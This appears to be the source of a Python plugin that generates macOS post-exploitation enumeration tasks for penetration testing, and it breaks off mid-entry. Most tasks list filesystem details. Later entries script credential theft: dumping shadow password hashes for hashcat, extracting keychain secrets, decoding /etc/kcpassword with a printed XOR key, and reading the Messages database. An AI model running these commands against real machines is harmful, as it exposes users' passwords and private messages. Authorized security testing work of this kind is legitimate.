"""
macOS Filesystem & Files Enumeration Plugin

Generates tasks for macOS filesystem enumeration including:
- File permissions and ACLs
- Extended attributes and resource forks
- APFS filesystem features
- Bundle structure analysis
- Sensitive file locations
- Mach-O binary analysis
- Package installer enumeration
- Memory artifacts
- Keychain dumping

Extracted from HackTricks:
- macos-files-folders-and-binaries/README.md
- macos-files-folders-and-binaries/macos-bundles.md
- macos-files-folders-and-binaries/macos-sensitive-locations.md
- macos-files-folders-and-binaries/macos-installers-abuse.md
- macos-files-folders-and-binaries/macos-memory-dumping.md
- macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md
- macos-applefs.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class MacOSFilesystemPlugin(ServicePlugin):
    """macOS filesystem and file enumeration plugin"""

    @property
    def name(self) -> str:
        return "macos-filesystem"

    @property
    def default_ports(self) -> List[int]:
        # Not port-based, triggered by macOS detection
        return []

    @property
    def service_names(self) -> List[str]:
        return ['macos', 'darwin', 'osx']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect macOS systems"""
        # Check for macOS indicators
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        ostype = port_info.get('ostype', '').lower()

        # Detect macOS-specific services or OS fingerprint
        macos_indicators = [
            'darwin' in ostype,
            'mac os' in ostype,
            'macos' in ostype,
            'apple' in product,
            'afp' in service,  # Apple Filing Protocol
            'bonjour' in service,
            'airplay' in service
        ]

        return any(macos_indicators)

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate macOS filesystem enumeration task tree"""

        tasks = {
            'id': f'macos-filesystem-{target}',
            'name': f'macOS Filesystem Enumeration: {target}',
            'type': 'parent',
            'children': []
        }

        # APFS Filesystem Enumeration
        tasks['children'].append({
            'id': f'apfs-enum-{target}',
            'name': 'APFS Filesystem Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'apfs-volumes-{target}',
                    'name': 'List APFS Volumes',
                    'type': 'command',
                    'metadata': {
                        'command': 'diskutil list',
                        'description': 'Get overview of APFS volumes (space sharing, snapshots)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'diskutil': 'Disk management utility for macOS',
                            'list': 'Display all disks and partitions'
                        },
                        'success_indicators': [
                            'APFS volumes listed',
                            'Container identifiers displayed',
                            'Volume groups shown'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Command not found'
                        ],
                        'next_steps': [
                            'Check for snapshots with diskutil apfs listSnapshots',
                            'Identify volumes with sensitive data',
                            'Review volume encryption status'
                        ],
                        'alternatives': [
                            'Manual: mount (show mounted filesystems)',
                            'Manual: df -h (disk space usage)',
                            'Manual: ls /Volumes/ (list mounted volumes)'
                        ],
                        'notes': 'APFS supports space sharing (volumes share disk space), snapshots (point-in-time backups), and clones (copy-on-write duplicates)'
                    }
                },
                {
                    'id': f'apfs-snapshots-{target}',
                    'name': 'List APFS Snapshots',
                    'type': 'command',
                    'metadata': {
                        'command': 'diskutil apfs list',
                        'description': 'Detailed APFS volume information including snapshots',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'apfs': 'APFS-specific operations',
                            'list': 'List detailed APFS structure'
                        },
                        'success_indicators': [
                            'Snapshot list retrieved',
                            'Volume details displayed',
                            'Encryption status shown'
                        ],
                        'failure_indicators': [
                            'No APFS volumes found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Mount snapshots to access historical data',
                            'Check for sensitive files in snapshots',
                            'Review snapshot creation timestamps'
                        ],
                        'alternatives': [
                            'Manual: tmutil listlocalsnapshots / (Time Machine snapshots)',
                            'Manual: ls /.vol/ (access volume by ID)'
                        ],
                        'notes': 'Snapshots are read-only point-in-time instances that can reveal deleted files or previous system states'
                    }
                },
                {
                    'id': f'apfs-firmlinks-{target}',
                    'name': 'Check Firmlinks Configuration',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /usr/share/firmlinks',
                        'description': 'List firmlinks (Data volume mounts at /System/Volumes/Data)',
                        'tags': ['OSCP:LOW', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'cat': 'Display file contents',
                            '/usr/share/firmlinks': 'Firmlinks configuration file'
                        },
                        'success_indicators': [
                            'Firmlink mappings displayed',
                            'Volume mount points shown'
                        ],
                        'failure_indicators': [
                            'File not found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Verify firmlink destinations exist',
                            'Check for unusual firmlink entries'
                        ],
                        'alternatives': [
                            'Manual: mount | grep Data (verify Data volume mount)',
                            'Manual: ls -la / (check for symbolic links)'
                        ],
                        'notes': 'Firmlinks map directories to Data volume. Check /System/Volumes/Data for actual data'
                    }
                }
            ]
        })

        # File Hierarchy Enumeration
        tasks['children'].append({
            'id': f'file-hierarchy-{target}',
            'name': 'File Hierarchy Exploration',
            'type': 'parent',
            'children': [
                {
                    'id': f'applications-enum-{target}',
                    'name': 'Enumerate Installed Applications',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la /Applications && ls -la ~/Applications',
                        'description': 'List installed applications (system and user)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '-l': 'Long format with permissions',
                            '-a': 'Show hidden files',
                            '/Applications': 'System-wide applications',
                            '~/Applications': 'User-specific applications'
                        },
                        'success_indicators': [
                            'Application bundles listed',
                            '.app directories shown',
                            'Permissions displayed'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Directory not found'
                        ],
                        'next_steps': [
                            'Identify vulnerable applications',
                            'Check application versions',
                            'Review application bundles for backdoors'
                        ],
                        'alternatives': [
                            'Manual: system_profiler SPApplicationsDataType',
                            'Manual: mdfind "kMDItemKind == Application"',
                            'Manual: find /Applications -name "*.app" -type d'
                        ],
                        'notes': 'Applications are bundles (.app directories) containing executable, resources, and Info.plist'
                    }
                },
                {
                    'id': f'library-enum-{target}',
                    'name': 'Enumerate Library Directories',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la /Library && ls -la ~/Library',
                        'description': 'List Library folders (preferences, caches, logs)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '/Library': 'System-wide library',
                            '~/Library': 'User library (preferences, application data)'
                        },
                        'success_indicators': [
                            'Library subdirectories listed',
                            'Application Support directories shown',
                            'Preferences folder accessible'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Hidden directory (requires ls -a)'
                        ],
                        'next_steps': [
                            'Check ~/Library/Application Support for app data',
                            'Review ~/Library/Preferences for configurations',
                            'Examine ~/Library/Logs for sensitive information'
                        ],
                        'alternatives': [
                            'Manual: ls -la ~/Library/Application\\ Support',
                            'Manual: ls -la ~/Library/Preferences',
                            'Manual: ls -la /Library/PrivilegedHelperTools (daemons)'
                        ],
                        'notes': 'Library contains application data, preferences, caches, and logs. User library is often hidden in Finder'
                    }
                },
                {
                    'id': f'sandboxed-apps-{target}',
                    'name': 'Enumerate Sandboxed Applications',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la ~/Library/Containers',
                        'description': 'List sandboxed application containers',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '~/Library/Containers': 'Sandboxed app data (by bundle ID)',
                            '-l': 'Show permissions and ownership',
                            '-a': 'Include hidden directories'
                        },
                        'success_indicators': [
                            'Container directories listed (com.apple.Safari format)',
                            'Bundle IDs displayed',
                            'Isolated app data accessible'
                        ],
                        'failure_indicators': [
                            'Directory not found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Identify sandboxed apps with sensitive data',
                            'Check container Data directories',
                            'Review sandbox exceptions in entitlements'
                        ],
                        'alternatives': [
                            'Manual: ls -la ~/Library/Containers/*/Data',
                            'Manual: find ~/Library/Containers -name "*.db"',
                            'Manual: grep -r "password" ~/Library/Containers/*/Data'
                        ],
                        'notes': 'Sandboxed apps store data in isolated containers named by bundle ID (e.g., com.apple.Safari)'
                    }
                },
                {
                    'id': f'kernel-extensions-{target}',
                    'name': 'Enumerate Kernel Extensions',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la /System/Library/Extensions && ls -la /Library/Extensions',
                        'description': 'List kernel extensions (kexts) - potential rootkits',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'MACOS', 'PRIVESC'],
                        'flag_explanations': {
                            '/System/Library/Extensions': 'Apple kernel extensions',
                            '/Library/Extensions': 'Third-party kernel extensions',
                            '.kext': 'Kernel extension bundle'
                        },
                        'success_indicators': [
                            'Kernel extensions listed',
                            '.kext bundles shown',
                            'Third-party kexts identified'
                        ],
                        'failure_indicators': [
                            'Permission denied (requires root)',
                            'Directory not accessible'
                        ],
                        'next_steps': [
                            'Identify unknown third-party kexts',
                            'Check kext signatures: codesign -v /path/to.kext',
                            'Review loaded kexts: kextstat'
                        ],
                        'alternatives': [
                            'Manual: kextstat (list loaded kexts)',
                            'Manual: kextfind -not -bundle-id com.apple.* (non-Apple kexts)',
                            'Manual: system_profiler SPExtensionsDataType'
                        ],
                        'notes': 'Kernel extensions run with kernel privileges. Malicious kexts can be rootkits. Modern macOS restricts kext loading'
                    }
                }
            ]
        })

        # File Permissions and ACLs
        tasks['children'].append({
            'id': f'file-perms-{target}',
            'name': 'File Permissions & ACL Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'acl-search-{target}',
                    'name': 'Find Files with ACLs',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -RAle / 2>/dev/null | grep -E -B1 "\\d: "',
                        'description': 'Find all files with Access Control Lists (ACLs)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '-R': 'Recursive search',
                            '-A': 'Show ACLs',
                            '-l': 'Long format',
                            '-e': 'Print ACL entries',
                            '2>/dev/null': 'Suppress permission errors',
                            'grep -E -B1 "\\d: "': 'Find ACL entries (numbered)'
                        },
                        'success_indicators': [
                            'Files with ACLs listed',
                            'ACE (Access Control Entries) displayed',
                            'Permissions shown (read, write, execute, delete)'
                        ],
                        'failure_indicators': [
                            'Very slow execution (large filesystem)',
                            'No ACLs found'
                        ],
                        'next_steps': [
                            'Review ACLs on sensitive files',
                            'Check for overly permissive ACLs',
                            'Identify privilege escalation via ACL misconfiguration'
                        ],
                        'alternatives': [
                            'Manual: ls -lde /path/file (check specific file ACL)',
                            'Manual: find /sensitive/path -ls (faster targeted search)',
                            'Manual: ls -ld Movies (example: drwx------+ indicates ACL)'
                        ],
                        'notes': 'ACLs provide granular permissions beyond standard Unix permissions. Look for "+" in ls output. WARNING: Full filesystem scan is very slow'
                    }
                },
                {
                    'id': f'special-flags-{target}',
                    'name': 'Find Files with Special Flags',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -lO /bin /usr/bin /Applications 2>/dev/null | grep -E "uchg|restricted|hidden"',
                        'description': 'Find files with special flags (uchg, restricted, hidden)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '-O': 'Show file flags',
                            'uchg': 'User immutable (cannot be changed)',
                            'restricted': 'SIP protected',
                            'hidden': 'Hidden from GUI'
                        },
                        'success_indicators': [
                            'Flagged files listed',
                            'Immutable files identified',
                            'SIP-protected files shown'
                        ],
                        'failure_indicators': [
                            'No special flags found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Try removing uchg flag: chflags nouchg file',
                            'Check if restricted files are SIP-protected',
                            'Identify persistence via immutable files'
                        ],
                        'alternatives': [
                            'Manual: ls -lO /path/directory (check specific directory)',
                            'Manual: chflags uchg file.txt (set immutable flag)',
                            'Manual: find / -flags uchg 2>/dev/null (find all immutable)'
                        ],
                        'notes': 'Flags: uchg (user immutable), restricted (SIP), sticky bit (prevent rename/delete). See sys/stat.h for all flags'
                    }
                },
                {
                    'id': f'sticky-bit-{target}',
                    'name': 'Find Directories with Sticky Bit',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -type d -perm +1000 2>/dev/null',
                        'description': 'Find directories with sticky bit (only owner can delete files)',
                        'tags': ['OSCP:LOW', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '-type d': 'Directories only',
                            '-perm +1000': 'Sticky bit set',
                            '2>/dev/null': 'Suppress errors'
                        },
                        'success_indicators': [
                            'Sticky bit directories listed',
                            '/tmp found (typically has sticky bit)',
                            'Shared directories identified'
                        ],
                        'failure_indicators': [
                            'Permission denied on some paths',
                            'Long execution time'
                        ],
                        'next_steps': [
                            'Check for writable sticky bit directories',
                            'Test if non-owner can delete files',
                            'Review /tmp for sensitive temp files'
                        ],
                        'alternatives': [
                            'Manual: ls -ld /tmp (check sticky bit: drwxrwxrwt)',
                            'Manual: chmod +t /directory (set sticky bit)',
                            'Manual: find /var -type d -perm +1000'
                        ],
                        'notes': 'Sticky bit (t in permissions) prevents users from deleting others files. Common on /tmp'
                    }
                }
            ]
        })

        # Extended Attributes and Resource Forks
        tasks['children'].append({
            'id': f'extended-attrs-{target}',
            'name': 'Extended Attributes Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'xattr-search-{target}',
                    'name': 'Find Files with Extended Attributes',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -type f -exec ls -ld {} \\; 2>/dev/null | grep -E "[x\\-]@ " | head -100',
                        'description': 'Find files with extended attributes (limited to 100 results)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '-type f': 'Files only',
                            '-exec ls -ld {}': 'List each file',
                            'grep -E "[x\\-]@ "': 'Match extended attribute indicator (@)',
                            'head -100': 'Limit to first 100 results'
                        },
                        'success_indicators': [
                            'Files with @ indicator listed',
                            'Extended attributes found',
                            'Metadata attributes identified'
                        ],
                        'failure_indicators': [
                            'No extended attributes found',
                            'Very slow execution'
                        ],
                        'next_steps': [
                            'Check quarantine attribute: xattr -l file',
                            'Review com.apple.quarantine for downloaded files',
                            'Search for com.apple.ResourceFork (ADS)'
                        ],
                        'alternatives': [
                            'Manual: ls -l@ /path/file (show extended attributes)',
                            'Manual: xattr -l file (list all extended attributes)',
                            'Manual: mdls file (metadata attributes)'
                        ],
                        'notes': 'Extended attributes store metadata. Common: com.apple.quarantine (downloads), com.apple.FinderInfo (Finder tags), com.apple.ResourceFork (ADS)'
                    }
                },
                {
                    'id': f'resource-fork-{target}',
                    'name': 'Find Files with Resource Forks (macOS ADS)',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -type f -exec ls -ld {} \\; 2>/dev/null | grep -E "[x\\-]@ " | awk \'{printf $9; printf "\\n"}\' | head -50 | xargs -I {} xattr -lv {} 2>/dev/null | grep "com.apple.ResourceFork"',
                        'description': 'Find files with Alternate Data Streams (Resource Forks)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'xattr -lv': 'List extended attributes with values',
                            'grep "com.apple.ResourceFork"': 'Find Resource Fork attribute',
                            'head -50': 'Limit to 50 files for speed'
                        },
                        'success_indicators': [
                            'Resource Fork attributes found',
                            'Hidden data in ADS discovered',
                            'com.apple.ResourceFork shown'
                        ],
                        'failure_indicators': [
                            'No Resource Forks found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Read Resource Fork: xattr -p com.apple.ResourceFork file',
                            'Check for hidden payloads in ADS',
                            'Access via: cat file/..namedfork/rsrc'
                        ],
                        'alternatives': [
                            'Manual: echo "data" > file/..namedfork/rsrc (create ADS)',
                            'Manual: xattr -l file (check for ResourceFork)',
                            'Manual: ls -l file (shows @ if extended attrs exist)'
                        ],
                        'notes': 'Resource Forks are macOS Alternate Data Streams. Write: echo "hidden" > file/..namedfork/rsrc. File size stays same'
                    }
                },
                {
                    'id': f'quarantine-attrs-{target}',
                    'name': 'Find Quarantined Files (Downloaded)',
                    'type': 'command',
                    'metadata': {
                        'command': 'mdfind "kMDItemWhereFroms == \'*\'" 2>/dev/null | head -100 | xargs -I {} xattr -l {} 2>/dev/null | grep -B1 quarantine',
                        'description': 'Find files with quarantine attribute (downloads from internet)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MACOS'],
                        'flag_explanations': {
                            'mdfind': 'Spotlight metadata search',
                            'kMDItemWhereFroms': 'Download source URL metadata',
                            'xattr -l': 'List extended attributes',
                            'grep quarantine': 'Find quarantine attribute'
                        },
                        'success_indicators': [
                            'Quarantined files found',
                            'Download sources identified',
                            'com.apple.quarantine attribute shown'
                        ],
                        'failure_indicators': [
                            'No quarantined files',
                            'Spotlight indexing disabled'
                        ],
                        'next_steps': [
                            'Check LaunchServices.QuarantineEventsV2 database',
                            'Review download sources for malicious URLs',
                            'Remove quarantine: xattr -d com.apple.quarantine file'
                        ],
                        'alternatives': [
                            'Manual: sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2',
                            'Manual: xattr -l downloaded_file',
                            'Manual: ls -l@ ~/Downloads/* (check downloads)'
                        ],
                        'notes': 'Quarantine attribute added to files downloaded from internet. Triggers Gatekeeper. See LSQuarantine for download URLs'
                    }
                },
                {
                    'id': f'compressed-files-{target}',
                    'name': 'Find Transparently Compressed Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -lO / /Applications /System 2>/dev/null | grep -i compressed | head -50',
                        'description': 'Find files with com.apple.decmpfs (transparent compression)',
                        'tags': ['OSCP:LOW', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '-O': 'Show file flags',
                            'compressed': 'UF_COMPRESSED flag',
                            'com.apple.decmpfs': 'Compression data in extended attribute'
                        },
                        'success_indicators': [
                            'Compressed files found',
                            'UF_COMPRESSED flag shown',
                            'Files with 0 byte size (data in xattr)'
                        ],
                        'failure_indicators': [
                            'No compressed files',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Check extended attribute: xattr -l file',
                            'Decompress: afscexpand file',
                            'Remove flag: chflags nocompressed file (breaks access)'
                        ],
                        'alternatives': [
                            'Manual: xattr -l file | grep decmpfs',
                            'Manual: ls -lO file (check for "compressed" flag)',
                            'Manual: file file (may show compression)'
                        ],
                        'notes': 'Files with com.apple.decmpfs store compressed data in extended attribute. ls -l shows 0 size. Accessed transparently'
                    }
                }
            ]
        })

        # Bundle Analysis
        tasks['children'].append({
            'id': f'bundle-analysis-{target}',
            'name': 'macOS Bundle Structure Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'app-bundle-{target}',
                    'name': 'Explore Application Bundle Structure',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -lR /Applications/*.app/Contents 2>/dev/null | head -200',
                        'description': 'Explore .app bundle internals (Info.plist, executable, resources)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '*.app/Contents': 'Application bundle contents directory',
                            '-R': 'Recursive listing',
                            'head -200': 'Limit output for readability'
                        },
                        'success_indicators': [
                            'Bundle structure revealed',
                            'Info.plist found',
                            'MacOS executable directory shown',
                            'Resources directory listed'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'No .app bundles found'
                        ],
                        'next_steps': [
                            'Read Info.plist: defaults read /path/to.app/Contents/Info.plist',
                            'Check CFBundleExecutable for main executable',
                            'Review Resources for backdoored assets',
                            'Check Frameworks for bundled dylibs'
                        ],
                        'alternatives': [
                            'Manual: ls -la /Applications/Safari.app/Contents',
                            'Manual: plutil -p /path/to.app/Contents/Info.plist',
                            'Manual: find /Applications/*.app -name Info.plist'
                        ],
                        'notes': 'Bundle structure: Contents/MacOS (executable), Contents/Resources (UI/images), Contents/Info.plist (config), Contents/Frameworks (libraries)'
                    }
                },
                {
                    'id': f'info-plist-{target}',
                    'name': 'Parse Application Info.plist Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Applications -name Info.plist -exec defaults read {} \\; 2>/dev/null | head -500',
                        'description': 'Extract application configuration from Info.plist files',
                        'tags': ['OSCP:HIGH', 'MACOS'],
                        'flag_explanations': {
                            'defaults read': 'Read plist file in readable format',
                            'Info.plist': 'Application configuration file',
                            'head -500': 'Limit output'
                        },
                        'success_indicators': [
                            'CFBundleIdentifier shown (e.g., com.apple.Safari)',
                            'CFBundleExecutable listed',
                            'LSMinimumSystemVersion displayed'
                        ],
                        'failure_indicators': [
                            'Binary plist (use plutil or defaults)',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Identify vulnerable app versions',
                            'Check for hardcoded credentials',
                            'Review URL schemes for exploitation'
                        ],
                        'alternatives': [
                            'Manual: plutil -p /path/to/Info.plist (readable format)',
                            'Manual: plutil -convert xml1 file.plist -o - (XML output)',
                            'Manual: /usr/libexec/PlistBuddy -c print file.plist'
                        ],
                        'notes': 'Key fields: CFBundleExecutable (main binary), CFBundleIdentifier (bundle ID), LSMinimumSystemVersion (min OS version)'
                    }
                },
                {
                    'id': f'framework-bundles-{target}',
                    'name': 'Enumerate Framework Bundles',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /System/Library/Frameworks /Library/Frameworks -name "*.framework" -type d 2>/dev/null | head -100',
                        'description': 'List framework bundles (shared libraries with resources)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '*.framework': 'Framework bundle extension',
                            '/System/Library/Frameworks': 'System frameworks',
                            '/Library/Frameworks': 'Third-party frameworks'
                        },
                        'success_indicators': [
                            'Framework bundles listed',
                            'System frameworks identified',
                            'Third-party frameworks shown'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'No frameworks found'
                        ],
                        'next_steps': [
                            'Check framework versions',
                            'Identify vulnerable frameworks',
                            'Review third-party frameworks for malware'
                        ],
                        'alternatives': [
                            'Manual: ls -la /System/Library/Frameworks',
                            'Manual: otool -L /path/to/binary (show linked frameworks)',
                            'Manual: find /Applications -name "*.framework"'
                        ],
                        'notes': 'Frameworks are like dylibs with extra resources. Contain versioned libraries and headers'
                    }
                },
                {
                    'id': f'plugin-bundles-{target}',
                    'name': 'Enumerate Plugin Bundles',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Library /System/Library ~/Library -name "*.bundle" -o -name "*.plugin" 2>/dev/null | head -100',
                        'description': 'Find plugin and extension bundles',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '*.bundle': 'Plugin bundle extension',
                            '*.plugin': 'Plugin extension',
                            '-o': 'OR operator for find'
                        },
                        'success_indicators': [
                            'Plugin bundles found',
                            'Extension points identified',
                            'Third-party plugins shown'
                        ],
                        'failure_indicators': [
                            'No plugins found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Check plugin signatures: codesign -v plugin',
                            'Review plugin Info.plist files',
                            'Test plugin loading for vulnerabilities'
                        ],
                        'alternatives': [
                            'Manual: ls -la /Library/Internet\\ Plug-Ins',
                            'Manual: find /Applications -name PlugIns -type d',
                            'Manual: system_profiler SPPluginsDataType'
                        ],
                        'notes': 'Plugins/bundles extend application functionality. Found in PlugIns directories within .app bundles'
                    }
                },
                {
                    'id': f'xpc-services-{target}',
                    'name': 'Enumerate XPC Services',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Applications /System/Applications -name "*.xpc" -type d 2>/dev/null | head -100',
                        'description': 'Find XPC service bundles (out-of-process communication)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '*.xpc': 'XPC service bundle',
                            'XPC': 'Inter-Process Communication framework',
                            '-type d': 'Directories only'
                        },
                        'success_indicators': [
                            'XPC services found',
                            'Service bundles listed',
                            'Helper tools identified'
                        ],
                        'failure_indicators': [
                            'No XPC services',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Review XPC service entitlements',
                            'Test for XPC privilege escalation',
                            'Check service launchd plists'
                        ],
                        'alternatives': [
                            'Manual: find /Applications -name XPCServices -type d',
                            'Manual: ls -la /app.app/Contents/XPCServices',
                            'Manual: launchctl list | grep xpc'
                        ],
                        'notes': 'XPC services enable secure IPC. Found in Contents/XPCServices. Can be privilege escalation targets'
                    }
                }
            ]
        })

        # Sensitive File Locations
        tasks['children'].append({
            'id': f'sensitive-files-{target}',
            'name': 'Sensitive File Location Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'shadow-passwords-{target}',
                    'name': 'Dump Shadow Passwords',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo bash -c \'for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done\' 2>/dev/null',
                        'description': 'Extract user shadow password hashes (requires root)',
                        'tags': ['OSCP:HIGH', 'PRIVESC', 'MACOS'],
                        'flag_explanations': {
                            '/var/db/dslocal/nodes/Default/users/': 'User account plists',
                            'defaults read': 'Read plist files',
                            'ShadowHashData': 'Password hash (PBKDF2-SHA512)'
                        },
                        'success_indicators': [
                            'User account data dumped',
                            'ShadowHashData retrieved',
                            'Hash info displayed'
                        ],
                        'failure_indicators': [
                            'Permission denied (need sudo)',
                            'ShadowHashData encrypted'
                        ],
                        'next_steps': [
                            'Extract hashes with davegrohl/teddziuba scripts',
                            'Crack with hashcat -m 7100 (macOS PBKDF2-SHA512)',
                            'Check dscl for ShadowHashData'
                        ],
                        'alternatives': [
                            'Manual: sudo dscl . -read /Users/username ShadowHashData',
                            'Manual: sudo plutil -extract ShadowHashData.0 raw /var/db/dslocal/nodes/Default/users/user.plist',
                            'One-liner hashcat format in documentation'
                        ],
                        'notes': 'Shadow passwords in user plists. Format: PBKDF2-SHA512. Hashcat mode 7100. Requires root access'
                    }
                },
                {
                    'id': f'keychain-list-{target}',
                    'name': 'List Keychains',
                    'type': 'command',
                    'metadata': {
                        'command': 'security list-keychains',
                        'description': 'List available keychain databases',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'security': 'Keychain access tool',
                            'list-keychains': 'Show keychain database paths'
                        },
                        'success_indicators': [
                            'Keychain paths listed',
                            'login.keychain found',
                            'System.keychain shown'
                        ],
                        'failure_indicators': [
                            'No keychains accessible',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Dump keychain: security dump-keychain -d',
                            'Extract passwords (prompts user)',
                            'Use keychaindump or chainbreaker for offline extraction'
                        ],
                        'alternatives': [
                            'Manual: ls -la ~/Library/Keychains',
                            'Manual: security dump-trust-settings',
                            'Manual: security list-smartcards'
                        ],
                        'notes': 'Keychains store passwords, certificates, keys. Login keychain unlocked at login. Requires user password for decryption'
                    }
                },
                {
                    'id': f'keychain-dump-{target}',
                    'name': 'Dump Keychain Entries (Interactive)',
                    'type': 'command',
                    'metadata': {
                        'command': 'security dump-keychain | grep -A 5 "keychain" | grep -v "version"',
                        'description': 'Dump keychain entries (user will be prompted)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'dump-keychain': 'Export keychain entries',
                            '-d': 'Include secrets (prompts for password)',
                            'grep -A 5': 'Show 5 lines after match'
                        },
                        'success_indicators': [
                            'Keychain entries listed',
                            'Service names shown',
                            'Account names displayed'
                        ],
                        'failure_indicators': [
                            'User denies access',
                            'Password required',
                            'Keychain locked'
                        ],
                        'next_steps': [
                            'Use security dump-keychain -d for passwords',
                            'Try keychaindump (root required)',
                            'Extract with chainbreaker offline'
                        ],
                        'alternatives': [
                            'Manual: security find-generic-password -ga account',
                            'Manual: security find-internet-password -ga account',
                            'Tool: keychaindump (requires root)',
                            'Tool: chainbreaker (offline extraction)'
                        ],
                        'notes': 'Dumping secrets prompts user. keychaindump targets securityd memory. chainbreaker works offline with SystemKey or password'
                    }
                },
                {
                    'id': f'kcpassword-{target}',
                    'name': 'Check kcpassword File (Auto-Login)',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo ls -la /etc/kcpassword 2>/dev/null && sudo xxd /etc/kcpassword',
                        'description': 'Check for auto-login password file (XOR encoded)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'MACOS', 'PRIVESC'],
                        'flag_explanations': {
                            '/etc/kcpassword': 'Auto-login password file',
                            'xxd': 'Hex dump to view XOR encoded password'
                        },
                        'success_indicators': [
                            'kcpassword file exists',
                            'File is readable',
                            'Hex dump shows XOR encoded data'
                        ],
                        'failure_indicators': [
                            'File not found (auto-login disabled)',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Decode with XOR key: 0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F',
                            'Use kcpassword decoder scripts',
                            'Recover user login password'
                        ],
                        'alternatives': [
                            'Manual: sudo cat /etc/kcpassword | xxd',
                            'Script: Use kcpassword decoder (GitHub)',
                            'Python: XOR decode with key'
                        ],
                        'notes': 'kcpassword stores auto-login password XORed with fixed key. Only exists if auto-login enabled. Easy to decode'
                    }
                },
                {
                    'id': f'messages-db-{target}',
                    'name': 'Extract Messages Database',
                    'type': 'command',
                    'metadata': {
                        'command': 'sqlite3 ~/Library/Messages/chat.db "SELECT * FROM message LIMIT 100"',
                        'description': 'Extract iMessage/SMS messages from chat database',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '~/Library/Messages/chat.db': 'Messages database',
                            'message': 'Message content table',
                            'LIMIT 100': 'First 100 messages'
                        },
                        'success_indicators': [
                            'Messages extracted',
                            'Chat content displayed',
                            'Timestamps shown'
                        ],
                        'failure_indicators': [
                            'Database locked',
